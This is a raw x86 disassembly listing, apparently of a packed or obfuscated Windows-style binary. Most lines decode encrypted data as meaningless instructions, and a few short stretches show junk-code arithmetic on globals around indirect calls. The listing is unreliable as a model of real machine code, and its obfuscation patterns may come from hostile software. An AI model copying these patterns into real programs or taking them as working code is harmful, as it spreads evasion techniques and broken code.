  404a6a:	sbb    ch,al
  404a6c:	in     al,dx
  404a6d:	cs in  eax,0x5a
  404a70:	(bad)  
  404a71:	mov    ecx,0x874fc0c2
  404a76:	fwait
  404a77:	cmp    DWORD PTR [edi],eax
  404a79:	out    0xda,al
  404a7b:	bound  edx,QWORD PTR [ebx+eiz*2-0x6f4451cb]
  404a82:	mov    esp,0xe138ec0f
  404a87:	je     0x404adb
  404a89:	jne    0x404a4b
  404a8b:	loop   0x404a77
  404a8d:	dec    ecx
  404a8e:	sub    ecx,DWORD PTR [edx-0x3c]
  404a91:	shrd   ecx,eax,0x2
  404a95:	add    DWORD PTR ds:0x4229a2,edi
  404a9b:	shr    eax,0x2
  404a9e:	mov    eax,DWORD PTR [ebx]
  404aa0:	mov    edx,DWORD PTR ds:0x4229a2
  404aa6:	xor    DWORD PTR ds:0x4228b2,edx
  404aac:	mov    edx,DWORD PTR [ebx+0x4]
  404aaf:	and    DWORD PTR ds:0x42293e,0x42295a
  404ab9:	xor    ecx,edi
  404abb:	shl    eax,0x1e
  404abe:	adc    DWORD PTR ds:0x4229a6,0x6b1a
  404ac8:	xor    eax,eax
  404aca:	or     DWORD PTR ds:0x422942,edi
  404ad0:	jmp    0x40505a
  404ad5:	xchg   DWORD PTR [edx+esi*8-0x3a],ebx
  404ad9:	fcomp  DWORD PTR [eax]
  404adb:	xor    bl,BYTE PTR [ecx+ebx*8]
  404ade:	ins    BYTE PTR es:[edi],dx
  404adf:	jp     0x404a8f
  404ae1:	mov    edx,0xac741aaf
  404ae6:	mov    bh,0x16
  404ae8:	push   ss
  404ae9:	cmp    eax,0xa3161604
  404aee:	jg     0x404ae2
  404af0:	out    dx,eax
  404af1:	lea    edi,[ecx]
  404af3:	dec    edx
  404af4:	sub    eax,0x2319e9de
  404af9:	jecxz  0x404b0d
  404afb:	sub    eax,0x281db8e2
  404b00:	clc    
  404b01:	aas    
  404b02:	xor    al,0xbb
  404b04:	push   eax
  404b05:	lods   eax,DWORD PTR ds:[esi]
  404b06:	aas    
  404b07:	and    al,0xb1
  404b09:	push   ds
  404b0a:	or     eax,0xda2b8ab3
  404b0f:	add    al,0x47
  404b11:	dec    ebx
  404b12:	and    DWORD PTR [edx-0xc0c21f7],0xfffffff7
  404b19:	fidiv  WORD PTR [ebx+eiz*1-0x3c632d85]
  404b20:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  404b22:	sub    ebp,ecx
  404b24:	mul    DWORD PTR [eax-0x9]
  404b27:	mov    ebp,ebx
  404b29:	xor    DWORD PTR [esi],ebp
  404b2b:	fs dec ebp
  404b2d:	jno    0x404af2
  404b2f:	xor    al,0x8c
  404b31:	outs   dx,DWORD PTR ds:[esi]
  404b32:	pop    edx
  404b33:	jbe    0x404bb3
  404b35:	pop    es
  404b36:	arpl   WORD PTR [ebx+0x25],si
  404b39:	enter  0x4bda,0x6c
  404b3d:	jae    0x404b30
  404b3f:	mov    ecx,DWORD PTR [ebp-0x5b579460]
  404b45:	les    eax,FWORD PTR [ebx-0xef0ecb4]
  404b4b:	add    esp,DWORD PTR [esp+ebp*8-0x44c3ab09]
  404b52:	sahf   
  404b53:	call   0xc38:0xd3a937a6
  404b5a:	mov    ah,dl
  404b5c:	mov    bh,0x4c
  404b5e:	fcom   DWORD PTR [edi]
  404b60:	mov    ds:0x2cfb1584,al
  404b65:	in     al,0xc5
  404b67:	mov    al,BYTE PTR [ebx-0x20b6fbb6]
  404b6d:	mov    eax,0xf3fdd167
  404b72:	pop    esi
  404b73:	or     al,0x76
  404b75:	aad    0xb2
  404b77:	popf   
  404b78:	pop    ds
  404b79:	push   ebx
  404b7a:	push   edi
  404b7b:	jp     0x404be6
  404b7d:	push   esp
  404b7e:	or     BYTE PTR [ebx+0x4],bh
  404b81:	add    al,0xa3
  404b83:	ja     0x404b96
  404b85:	add    eax,0xf9bc40d4
  404b8a:	mov    al,0x21
  404b8c:	sub    BYTE PTR [ecx],ah
  404b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b8f:	push   edx
  404b90:	out    dx,al
  404b91:	mov    bh,0x97
  404b93:	xor    eax,0x13f4c757
  404b98:	and    DWORD PTR [ebx],0xffffffcd
  404b9b:	call   0xc0515df1
  404ba0:	pop    esp
  404ba1:	mov    ds:0xfea7699,al
  404ba6:	jge    0x404bde
  404ba8:	imul   edx,edx,0x78c3e1ce
  404bae:	mov    cl,0xed
  404bb0:	pop    esp
  404bb1:	cmp    DWORD PTR [ebx+0x38],0xe094d119
  404bb8:	xchg   edx,eax
  404bb9:	jmp    0x192c:0x185798e6
  404bc0:	in     eax,dx
  404bc1:	add    al,BYTE PTR ds:0x49a5fcdc
  404bc7:	scas   al,BYTE PTR es:[edi]
  404bc8:	mov    dl,0xfa
  404bca:	sub    ebx,0xc0b691a4
  404bd0:	call   0xa75:0x5196ba23
  404bd7:	mov    ch,BYTE PTR [ecx]
  404bd9:	push   edi
  404bda:	adc    ebx,esi
  404bdc:	inc    eax
  404bdd:	inc    ebp
  404bde:	inc    edx
  404bdf:	push   ss
  404be0:	and    BYTE PTR [esi+0x3df7021b],dl
  404be6:	push   ecx
  404be7:	loope  0x404c13
  404be9:	icebp  
  404bea:	shr    BYTE PTR [edi],0x2c
  404bed:	mov    edx,0x64005dab
  404bf2:	xor    BYTE PTR [eax],al
  404bf4:	lods   eax,DWORD PTR ss:[esi]
  404bf6:	in     al,0xae
  404bf8:	adc    al,0x90
  404bfa:	sbb    esi,edi
  404bfc:	es dec esp
  404bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bff:	aam    0x76
  404c01:	or     ebp,DWORD PTR [ecx]
  404c03:	mov    ss,WORD PTR [esi-0x6]
  404c06:	stc    
  404c07:	pop    es
  404c08:	(bad)  [ecx]
  404c0a:	dec    ebx
  404c0b:	dec    eax
  404c0c:	fs inc esp
  404c0e:	repnz cld 
  404c10:	jne    0x404bbe
  404c12:	dec    ebp
  404c13:	or     eax,0x87f153f0
  404c18:	and    DWORD PTR [ebx+0x21],0xffffffb1
  404c1c:	xchg   esp,esp
  404c1e:	pop    eax
  404c1f:	lods   eax,DWORD PTR ds:[esi]
  404c20:	pop    esp
  404c21:	mov    al,0x65
  404c23:	fmul   QWORD PTR [esp+eax*1-0x452efae1]
  404c2a:	sbb    ah,BYTE PTR [eax-0x39605719]
  404c30:	test   al,0xf3
  404c32:	(bad)  
  404c33:	sub    esp,DWORD PTR [edi]
  404c35:	xchg   eax,edi
  404c37:	test   BYTE PTR [ebx+0x4d],dh
  404c3a:	and    BYTE PTR [esi+0x1bcd01d3],dh
  404c40:	add    DWORD PTR [esp+eiz*8],ecx
  404c43:	push   eax
  404c44:	cmp    DWORD PTR [ebp+0x27],edi
  404c47:	ret    0xddd
  404c4a:	ins    BYTE PTR es:[edi],dx
  404c4b:	int    0x5e
  404c4d:	(bad)  
  404c4e:	jns    0x404c63
  404c50:	mov    al,ds:0xa208bd6f
  404c55:	mov    ebx,DWORD PTR [ebx+0x74b3aefb]
  404c5b:	dec    ebx
  404c5c:	in     al,0x36
  404c5e:	aad    0xbc
  404c60:	jg     0x404c64
  404c62:	and    ch,cl
  404c64:	jmp    0xd10b9dfc
  404c69:	cs jmp 0x404cd5
  404c6c:	mov    edx,0x2f5d11ed
  404c71:	inc    ecx
  404c72:	mov    BYTE PTR [ebx-0x60],al
  404c75:	cmp    ecx,DWORD PTR [ebx+0x21cda88b]
  404c7b:	jecxz  0x404c72
  404c7d:	xor    eax,0xe1cf4dd6
  404c82:	cmp    dh,BYTE PTR [eax+edi*2+0x17]
  404c86:	push   eax
  404c87:	fdiv   DWORD PTR [edi+0x34ea3f02]
  404c8d:	or     eax,0x39c1e419
  404c92:	nop
  404c93:	mov    al,0xbf
  404c95:	push   ebp
  404c96:	daa    
  404c97:	push   esp
  404c98:	adc    al,bh
  404c9a:	mov    bh,0x9f
  404c9c:	add    DWORD PTR ds:0xac67e17f,edx
  404ca2:	jb     0x404ccf
  404ca4:	xchg   ebp,eax
  404ca5:	js     0x404d11
  404ca7:	jge    0x404d06
  404ca9:	push   0x4a11e719
  404cae:	mov    bh,0xc2
  404cb0:	cmp    BYTE PTR [eax+0x22],0x41
  404cb4:	fmul   QWORD PTR [eax+ebx*1+0x2e]
  404cb8:	xchg   esp,eax
  404cb9:	in     al,dx
  404cba:	(bad)  
  404cbb:	stc    
  404cbc:	xchg   esi,eax
  404cbd:	pop    ecx
  404cbe:	retf   0xda26
  404cc1:	hlt    
  404cc2:	in     eax,dx
  404cc3:	int    0x27
  404cc5:	scas   eax,DWORD PTR es:[edi]
  404cc6:	fisttp WORD PTR [edi-0x5f7db739]
  404ccc:	dec    esp
  404ccd:	cmp    edi,DWORD PTR [ebp-0x14]
  404cd0:	xchg   esi,ecx
  404cd2:	jle    0x404d25
  404cd4:	je     0x404cba
  404cd6:	or     al,0x3f
  404cd8:	add    bl,BYTE PTR [edi+0x28ef56b7]
  404cde:	cmp    BYTE PTR [edx-0x1c7db658],bl
  404ce4:	icebp  
  404ce5:	mov    edx,ecx
  404ce7:	jo     0x404d1e
  404ce9:	pop    ebx
  404cea:	and    esp,0x6da71ca4
  404cf0:	imul   esp,DWORD PTR [esi-0x12d2705d],0x13
  404cf7:	jg     0x404ce8
  404cf9:	icebp  
  404cfa:	mov    ds:0x24eb6da0,al
  404cff:	adc    al,0xc5
  404d01:	lock jns 0x404c86
  404d04:	jb     0x404d35
  404d06:	push   ds
  404d07:	shr    DWORD PTR [edx+ebx*4-0x39e4328f],cl
  404d0e:	mov    ebx,0xbe6b102a
  404d13:	call   0x223d0357
  404d18:	cli    
  404d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d1a:	xchg   esi,eax
  404d1b:	pop    eax
  404d1c:	sub    DWORD PTR [esp+ebp*8-0x6aff2410],edi
  404d23:	into   
  404d24:	dec    esp
  404d25:	lock std 
  404d27:	stc    
  404d28:	or     dl,BYTE PTR [esi-0x250b7d78]
  404d2e:	shl    BYTE PTR [ecx+ebp*1-0xf],1
  404d32:	cwde   
  404d33:	cmp    BYTE PTR [edx-0x9],dh
  404d36:	imul   edx,esp,0x3d
  404d39:	out    0xae,al
  404d3b:	mov    esp,DWORD PTR [ecx-0x16ff6783]
  404d41:	pushf  
  404d42:	adc    ah,bl
  404d44:	xchg   ecx,eax
  404d46:	loopne 0x404d9c
  404d48:	sub    edx,esp
  404d4a:	lds    ecx,FWORD PTR [ebp+0x3b337886]
  404d50:	jl     0x404d89
  404d52:	(bad)  [ebx]
  404d54:	test   eax,0x7c3ff057
  404d59:	leave  
  404d5a:	mov    esp,0xda62e9f9
  404d5f:	adc    edx,0x8f28768a
  404d65:	xor    al,0x66
  404d67:	xchg   ebp,eax
  404d68:	fisttp QWORD PTR ds:0xc783a6d3
  404d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d6f:	(bad)  
  404d70:	xor    cl,dh
  404d72:	sar    DWORD PTR [edx+0x49],cl
  404d75:	(bad)  
  404d76:	fld    TBYTE PTR [ecx+0x3226a844]
  404d7c:	adc    eax,edi
  404d7e:	mov    eax,0x91740702
  404d83:	retf   0xb5a9
  404d86:	arpl   WORD PTR [esi],sp
  404d88:	fisub  WORD PTR [edx+0x2197c119]
  404d8e:	cwde   
  404d8f:	iret   
  404d90:	mov    esp,0x2b295ec6
  404d95:	or     BYTE PTR [edi-0x4f],dh
  404d98:	add    DWORD PTR [ebx-0x43],edx
  404d9b:	sbb    al,0x27
  404d9d:	jae    0x404d54
  404d9f:	ins    BYTE PTR es:[edi],dx
  404da0:	test   DWORD PTR [ebp+eax*1+0x44],ecx
  404da4:	sbb    BYTE PTR [esi-0x3e3a9f3b],cl
  404daa:	cs adc eax,0x73f815d2
  404db0:	xchg   edx,eax
  404db1:	shr    DWORD PTR [ebp-0x48],1
  404db4:	dec    ebx
  404db5:	mov    es,WORD PTR [ebp+0x60]
  404db8:	or     eax,0x2987f8be
  404dbd:	mov    dh,0x56
  404dbf:	mov    ch,0xcf
  404dc1:	test   BYTE PTR [esi],dl
  404dc3:	test   DWORD PTR [eax+0xb0c317c],eax
  404dc9:	enter  0xb6ed,0x1e
  404dcd:	stc    
  404dce:	pop    eax
  404dcf:	jmp    0x272e:0x5f24094a
  404dd6:	mov    eax,ds:0xd0cc055e
  404ddb:	jno    0x404de9
  404ddd:	sbb    al,0x3c
  404ddf:	sbb    DWORD PTR [ebp+0x18],ecx
  404de2:	in     al,0x25
  404de4:	sbb    BYTE PTR [ecx-0x645b2130],al
  404dea:	mov    es:0x907d4b9d,eax
  404df0:	imul   edi,DWORD PTR [esi],0x590f0f38
  404df6:	lahf   
  404df7:	push   esp
  404df8:	mov    cl,0x17
  404dfa:	cmp    ecx,DWORD PTR [ebx+edi*1-0x62]
  404dfe:	ret    
  404dff:	and    al,0xe6
  404e01:	pop    esi
  404e02:	sbb    DWORD PTR [eax],edi
  404e04:	fdivr  DWORD PTR [esi]
  404e06:	sub    al,0x46
  404e08:	mov    al,ds:0x21e6e91f
  404e0d:	xor    BYTE PTR [esi-0x3b],bh
  404e10:	sub    bh,BYTE PTR [edx-0x57]
  404e13:	fisubr DWORD PTR [ebx]
  404e15:	dec    esi
  404e16:	cmp    al,0xfa
  404e18:	xchg   esi,eax
  404e19:	xchg   ebp,eax
  404e1a:	jnp    0x404e76
  404e1c:	test   BYTE PTR [ecx-0x25a31fd7],cl
  404e22:	sbb    eax,0x5325b3e2
  404e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e28:	push   ds
  404e29:	or     dh,al
  404e2b:	mov    ?,WORD PTR [eax]
  404e2d:	loopne 0x404e8d
  404e2f:	inc    ecx
  404e30:	jg     0x404ea3
  404e32:	xchg   ebp,eax
  404e33:	cmp    esp,DWORD PTR [eax-0x5c9d72bb]
  404e39:	daa    
  404e3a:	xlat   BYTE PTR ds:[ebx]
  404e3b:	jg     0x404e38
  404e3d:	mov    bl,0x44
  404e3f:	xor    eax,0x2f02f9a5
  404e44:	call   0x9188:0xd4b53ff3
  404e4b:	mov    BYTE PTR [esi+0x7417847],ch
  404e51:	jo     0x404e26
  404e53:	imul   ebx,DWORD PTR [ecx],0xfffffffe
  404e56:	mov    dh,0x8d
  404e58:	fdiv   st,st(2)
  404e5a:	jecxz  0x404ed9
  404e5c:	cmp    edx,esi
  404e5e:	lods   al,BYTE PTR ds:[esi]
  404e5f:	aas    
  404e60:	pop    eax
  404e61:	test   DWORD PTR [edx+0xa12395c],0xa8fc1903
  404e6b:	ins    DWORD PTR es:[edi],dx
  404e6c:	jne    0x404e0c
  404e6e:	iret   
  404e6f:	pop    edx
  404e70:	jne    0x404e0b
  404e72:	(bad)  
  404e73:	cmp    eax,0x69eef76
  404e78:	imul   esp,DWORD PTR [edi-0x2c],0x5f
  404e7c:	cmp    eax,0x684f1cc
  404e81:	call   0xb3bdad9e
  404e86:	xor    eax,0x7c906d4c
  404e8b:	dec    esi
  404e8c:	out    dx,eax
  404e8d:	enter  0x5555,0x4c
  404e91:	push   0x5b0689a8
  404e96:	scas   al,BYTE PTR es:[edi]
  404e97:	js     0x404e8b
  404e99:	and    ch,BYTE PTR [ecx-0x25]
  404e9c:	mov    BYTE PTR [ecx+0x47d1d0c5],ah
  404ea2:	in     al,0xa4
  404ea4:	clc    
  404ea5:	or     DWORD PTR [edi+0x8],ebp
  404ea8:	int    0xf8
  404eaa:	xor    BYTE PTR [ebx+edx*8+0x52],0x58
  404eaf:	mov    edi,0xbe8bfa20
  404eb4:	sub    eax,0xd196a813
  404eb9:	aaa    
  404eba:	in     al,dx
  404ebb:	cld    
  404ebc:	add    BYTE PTR [eax],al
  404ebe:	sub    al,0x83
  404ec1:	les    edx,FWORD PTR [ecx]
  404ec3:	mov    edi,0x92a209ce
  404ec8:	or     ebp,ecx
  404eca:	das    
  404ecb:	sahf   
  404ecc:	jae    0x404e96
  404ece:	push   esp
  404ecf:	imul   eax,DWORD PTR [edi-0x3e],0xeffaddf2
  404ed6:	push   esi
  404ed7:	or     edi,DWORD PTR [edx]
  404ed9:	adc    edi,edi
  404edb:	jp     0x404ea7
  404edd:	enter  0x85a,0x1
  404ee1:	xchg   edx,eax
  404ee2:	lea    ebp,[esi-0x27957d45]
  404ee8:	retf   
  404ee9:	int3   
  404eea:	cmp    al,BYTE PTR [edx]
  404eec:	sbb    BYTE PTR [ebx+0x71],dh
  404eef:	mov    ecx,0x5812bde9
  404ef4:	and    BYTE PTR gs:[edi+edi*1],0xf4
  404ef9:	sub    ch,bl
  404efb:	lds    esp,FWORD PTR [ebp+eax*2-0x2389f8fb]
  404f02:	and    cl,BYTE PTR [esi+0x7]
  404f05:	sub    DWORD PTR [ecx],edx
  404f07:	stos   BYTE PTR es:[edi],al
  404f08:	inc    edx
  404f09:	das    
  404f0a:	mov    ?,WORD PTR [edx]
  404f0c:	or     BYTE PTR [ebx*2-0x554481bb],al
  404f13:	fdivp  st(5),st
  404f15:	xor    dh,al
  404f17:	dec    edi
  404f18:	sub    ecx,eax
  404f1a:	or     DWORD PTR [ecx-0x710ae7b8],0xffffffdf
  404f21:	arpl   bx,bp
  404f23:	add    bh,bl
  404f25:	dec    eax
  404f26:	ror    BYTE PTR [ebp-0x74],0x20
  404f2a:	jmp    0x868db4cd
  404f2f:	inc    edx
  404f30:	loopne 0x404eba
  404f32:	jmp    0x3e3d:0x35436743
  404f39:	test   al,0x9
  404f3b:	arpl   WORD PTR [esi],ax
  404f3d:	shl    BYTE PTR [ecx-0x7d9b56b2],0x34
  404f44:	retf   
  404f45:	jno    0x404f3b
  404f47:	inc    esp
  404f48:	in     al,0x3b
  404f4a:	mov    esp,0x48b1e60c
  404f4f:	and    bh,BYTE PTR [ebx-0x26]
  404f52:	mul    BYTE PTR [esi+eax*4+0x334a61ff]
  404f59:	clc    
  404f5a:	aam    0x71
  404f5c:	scas   eax,DWORD PTR es:[edi]
  404f5d:	loopne 0x404f91
  404f5f:	push   esp
  404f60:	push   ss
  404f61:	push   ebx
  404f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f63:	outs   dx,BYTE PTR ds:[esi]
  404f64:	lods   al,BYTE PTR ds:[esi]
  404f65:	dec    edx
  404f66:	fs loopne 0x404fb0
  404f69:	mov    bh,0x6c
  404f6b:	test   DWORD PTR [edi+0x17eb90df],eax
  404f71:	xor    DWORD PTR [ebx+0x26bffdce],eax
  404f77:	jae    0x404f71
  404f79:	mov    es,WORD PTR [ebx+eiz*2]
  404f7c:	scas   al,BYTE PTR es:[edi]
  404f7d:	jle    0x404f20
  404f7f:	and    al,0x16
  404f81:	aam    0xfc
  404f83:	adc    ebx,DWORD PTR [ebp-0x5fe5ca38]
  404f89:	(bad)  
  404f8a:	push   edi
  404f8b:	loopne 0x404f69
  404f8d:	pop    esi
  404f8e:	lds    esi,FWORD PTR [esi]
  404f90:	repz push ebp
  404f92:	inc    eax
  404f93:	adc    al,ah
  404f95:	jmp    0xe2f9:0x90d32584
  404f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f9d:	push   ebx
  404f9e:	mov    ebp,DWORD PTR ds:0xdfdda18c
  404fa4:	inc    ebx
  404fa5:	clc    
  404fa6:	xor    al,0x22
  404fa8:	jg     0x404f4f
  404faa:	push   ds
  404fab:	adc    dh,bl
  404fad:	jbe    0x404f3e
  404faf:	stos   BYTE PTR es:[edi],al
  404fb0:	sub    edi,DWORD PTR [edi-0x23b54050]
  404fb6:	xor    ebx,DWORD PTR [edi-0x61]
  404fb9:	mov    eax,0x4612c206
  404fbe:	pop    edx
  404fbf:	arpl   si,si
  404fc1:	hlt    
  404fc2:	(bad)  
  404fc3:	cld    
  404fc4:	and    eax,DWORD PTR [esi]
  404fc6:	jnp    0x40501f
  404fc8:	inc    ebx
  404fc9:	inc    esp
  404fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fcb:	lea    ecx,[ebx+0x1042617c]
  404fd1:	test   bh,ah
  404fd3:	cmp    al,0xc5
  404fd5:	imul   ebp,edx,0x6bb6990f
  404fdb:	mov    bh,0xb6
  404fdd:	(bad)  
  404fde:	rcl    BYTE PTR [ebp+0x12693352],cl
  404fe4:	jg     0x404f7c
  404fe6:	xor    BYTE PTR [edx-0x4c],bl
  404fe9:	cmp    BYTE PTR ds:0x80a3fa93,bl
  404fef:	pop    es
  404ff0:	jge    0x404f8a
  404ff2:	inc    edx
  404ff3:	cld    
  404ff4:	inc    ebp
  404ff5:	ror    BYTE PTR [ecx],cl
  404ff7:	mov    WORD PTR [esi+eiz*1],?
  404ffa:	call   0xce03385b
  404fff:	pop    esp
  405000:	ss mov edi,ebp
  405003:	sub    al,0x41
  405005:	add    eax,0x7dc96f53
  40500a:	jecxz  0x404ff9
  40500c:	scas   eax,DWORD PTR es:[edi]
  40500d:	ret    
  40500e:	push   ebx
  40500f:	aaa    
  405010:	mov    ecx,0x4ba156fc
  405015:	sub    BYTE PTR [esi-0x61],ah
  405018:	xor    DWORD PTR [esi],0xffffffdf
  40501b:	pushf  
  40501c:	popf   
  40501d:	nop
  40501e:	push   0x35
  405020:	ja     0x404fbb
  405022:	cmp    eax,0x722e15dd
  405027:	cs (bad) 
  405029:	and    eax,0x98d550f6
  40502e:	arpl   WORD PTR [esp+esi*1],dx
  405031:	cmp    ebx,DWORD PTR [ebp+0x3d]
  405034:	push   eax
  405035:	push   esp
  405036:	and    BYTE PTR [esi+esi*8],bl
  405039:	lahf   
  40503a:	imul   ebp,DWORD PTR [edx+edx*4-0x36566a3c],0x16786ca8
  405045:	inc    eax
  405046:	dec    ebp
  405047:	push   es
  405048:	pop    ecx
  405049:	jno    0x405011
  40504b:	mov    bl,0x54
  40504d:	cmp    eax,0x93504a39
  405052:	xchg   ecx,eax
  405053:	sbb    edx,DWORD PTR [edi]
  405055:	aad    0xb
  405057:	aam    0x44
  405059:	es or  eax,ecx
  40505c:	sub    DWORD PTR ds:0x42294a,0x3e8c
  405066:	mov    ecx,DWORD PTR [ebx]
  405068:	cmp    DWORD PTR ds:0x42291a,0x0
  40506f:	mov    edx,0x329b
  405074:	mov    DWORD PTR ds:0x42298e,edi
  40507a:	mov    DWORD PTR ds:0x422992,0x6944
  405084:	jmp    0x4050d1
  405089:	mov    DWORD PTR ds:0x4228a2,0x4c5b
  405093:	mov    DWORD PTR ds:0x42294a,0x78c7
  40509d:	jae    0x4050b9
  4050a3:	call   DWORD PTR ds:0x42a048
  4050a9:	and    DWORD PTR ds:0x422976,edi
  4050af:	sub    DWORD PTR ds:0x42292a,0xcc1
  4050b9:	add    edx,DWORD PTR ds:0x4228fe
  4050bf:	mov    edx,DWORD PTR ds:0x4229ae
  4050c5:	xor    DWORD PTR ds:0x42288a,edx
  4050cb:	xor    DWORD PTR ds:0x4228a6,ebx
  4050d1:	mov    edx,DWORD PTR [ebx+0x4]
  4050d4:	shrd   ecx,edx,0x2
  4050d8:	shr    edx,0x2
  4050db:	dec    edx
  4050dc:	mov    DWORD PTR [ebp-0x1c],ecx
  4050df:	mov    ecx,DWORD PTR [ebx]
  4050e1:	cmp    DWORD PTR ds:0x422956,0x0
  4050e8:	mov    DWORD PTR ds:0x4229a6,ecx
  4050ee:	mov    DWORD PTR ds:0x4228be,0x46b1
  4050f8:	mov    edx,0x1a3a
  4050fd:	jmp    0x405154
  405102:	mov    edx,DWORD PTR ds:0x4229be
  405108:	je     0x405144
  40510e:	push   0x4228ce
  405113:	push   0x891e
  405118:	call   DWORD PTR ds:0x42a298
  40511e:	mov    edx,DWORD PTR ds:0x422976
  405124:	sbb    DWORD PTR ds:0x4229a6,edx
  40512a:	or     DWORD PTR ds:0x4229b6,0x4229c6
  405134:	or     edx,DWORD PTR ds:0x4229ba
  40513a:	adc    DWORD PTR ds:0x42295a,0x7410
  405144:	xor    DWORD PTR ds:0x422932,0x293b
  40514e:	or     DWORD PTR ds:0x422982,edx
  405154:	mov    edx,DWORD PTR [ebx+0x4]
  405157:	or     DWORD PTR ds:0x422992,0x45bc
  405161:	xor    DWORD PTR [ebp-0x1c],edi
  405164:	sbb    DWORD PTR ds:0x4229ca,0x422976
  40516e:	xor    edx,edx
  405170:	not    DWORD PTR ds:0x4228d2
  405176:	or     edx,DWORD PTR [ebp-0x1c]
  405179:	or     DWORD PTR ds:0x42291e,0x4228e6
  405183:	jmp    0x40570d
  405188:	mov    cl,0xe1
  40518a:	inc    eax
  40518b:	test   al,0x40
  40518d:	sub    BYTE PTR [ecx],bl
  40518f:	fcomp  st(5)
  405191:	dec    edx
  405192:	int3   
  405193:	outs   dx,BYTE PTR ds:[esi]
  405194:	push   es
  405195:	mov    ds:0xa3dbb292,al
  40519a:	push   ss
  40519b:	push   ss
  40519c:	cmp    eax,0x98161604
  4051a1:	sbb    edi,0xffffffdd
  4051a4:	int3   
  4051a5:	mov    ch,0x75
  4051a7:	and    BYTE PTR [edi+0x77793094],0x32
  4051ae:	popa   
  4051af:	add    edx,DWORD PTR [eax+0x54]
  4051b2:	je     0x405206
  4051b4:	ffreep st(6)
  4051b6:	fild   DWORD PTR [edx]
  4051b8:	sbb    DWORD PTR [edi+0x6a],edi
  4051bb:	add    DWORD PTR [ecx],esi
  4051bd:	mov    dh,0xfb
  4051bf:	ret    
  4051c0:	xchg   edx,eax
  4051c1:	xchg   edi,eax
  4051c2:	in     eax,dx
  4051c3:	stos   DWORD PTR es:[edi],eax
  4051c4:	adc    al,0x57
  4051c6:	shl    DWORD PTR [edi+0x47],cl
  4051c9:	sbb    BYTE PTR [eax+0x25],bh
  4051cc:	out    dx,al
  4051cd:	stos   DWORD PTR es:[edi],eax
  4051ce:	ror    BYTE PTR [edx+0x3ee8b9ee],cl
  4051d4:	add    ecx,DWORD PTR [ebx]
  4051d6:	push   DWORD PTR ds:[edx-0x5a399389]
  4051dd:	cs mov dh,0x1
  4051e0:	outs   dx,DWORD PTR ds:[esi]
  4051e1:	push   es
  4051e2:	push   ebp
  4051e3:	(bad)  
  4051e4:	lods   eax,DWORD PTR ds:[esi]
  4051e5:	fs cli 
  4051e7:	adc    al,0x5a
  4051e9:	sub    ebp,DWORD PTR [ebp+0x6]
  4051ec:	sti    
  4051ed:	mov    esi,0xe12528d2
  4051f2:	(bad)  [ecx*2+0x15ec1699]
  4051f9:	cmp    eax,DWORD PTR [ecx*4+0x319bbe90]
  405200:	dec    esp
  405201:	push   edx
  405202:	sbb    BYTE PTR [eax+0x37],ch
  405205:	add    DWORD PTR [edx+edi*4-0x7f],edx
  405209:	leave  
  40520a:	aad    0x91
  40520c:	mov    edx,0x9371507b
  405211:	xchg   ebx,eax
  405212:	ret    
  405213:	scas   eax,DWORD PTR es:[edi]
  405214:	xchg   ebp,eax
  405215:	pop    esi
  405216:	popf   
  405217:	inc    edi
  405218:	out    dx,al
  405219:	daa    
  40521a:	(bad)  
  40521b:	imul   eax,DWORD PTR [eax],0xffffffad
  40521e:	xchg   BYTE PTR [edx+0x5d],dh
  405221:	sahf   
  405222:	(bad)  
  405224:	mov    bl,bh
  405226:	pop    esi
  405227:	sbb    eax,0xb87951c0
  40522c:	out    dx,al
  40522d:	out    dx,eax
  40522e:	push   0x7f0bd15
  405233:	push   esp
  405234:	jmp    0xea463d76
  405239:	pop    ss
  40523a:	int    0x3d
  40523c:	cmp    bh,cl
  40523e:	push   ds
  40523f:	adc    BYTE PTR [edi-0xb10da40],bl
  405245:	cdq    
  405246:	ins    DWORD PTR es:[edi],dx
  405247:	in     eax,dx
  405248:	xor    DWORD PTR [ebp-0x6f],edi
  40524b:	mov    eax,0x31a88ae2
  405250:	push   ss
  405251:	into   
  405252:	inc    eax
  405253:	(bad)  
  405254:	xor    BYTE PTR [edx+0x39ddcec5],0x21
  40525b:	mov    bp,0x9181
  40525f:	in     eax,0x6d
  405261:	or     BYTE PTR [ebp-0x48fb4235],bh
  405267:	pop    eax
  405268:	mov    DWORD PTR [edx-0x5db77804],ebx
  40526e:	push   0xffffffa3
  405270:	xlat   BYTE PTR ds:[ebx]
  405271:	neg    DWORD PTR [ebx+0x552c1b6a]
  405277:	push   edx
  405278:	inc    ecx
  405279:	sbb    ch,BYTE PTR [esi]
  40527b:	and    BYTE PTR [ecx-0x11],dh
  40527e:	dec    edi
  40527f:	fnsave [eax-0x76]
  405282:	stos   BYTE PTR es:[edi],al
  405283:	rcr    BYTE PTR [ebx-0x49],0x7b
  405287:	jbe    0x405254
  405289:	les    esi,FWORD PTR [edi-0x38fed226]
  40528f:	pushf  
  405290:	cmp    cl,BYTE PTR [ebx+0x16]
  405293:	std    
  405294:	retf   
  405295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405296:	fimul  WORD PTR [edx]
  405298:	xor    ch,bh
  40529a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40529b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40529c:	shrx   esi,DWORD PTR ds:0xe1078ffb,esi
  4052a5:	pop    ds
  4052a6:	fcmove st,st(6)
  4052a8:	repz imul edi,DWORD PTR [ecx+edx*2],0xfffffff5
  4052ad:	scas   eax,DWORD PTR es:[edi]
  4052ae:	ror    BYTE PTR [ebx-0x7b4fb797],cl
  4052b4:	aam    0xa9
  4052b6:	out    dx,eax
  4052b7:	inc    eax
  4052b8:	fild   DWORD PTR [eax+ebp*2-0x9c925cb]
  4052bf:	cmp    dh,bl
  4052c1:	ret    0xbafe
  4052c4:	ja     0x405249
  4052c6:	mov    eax,ds:0xe6fdaf02
  4052cb:	pop    ecx
  4052cc:	mov    ah,0x86
  4052ce:	sub    DWORD PTR [eax],esi
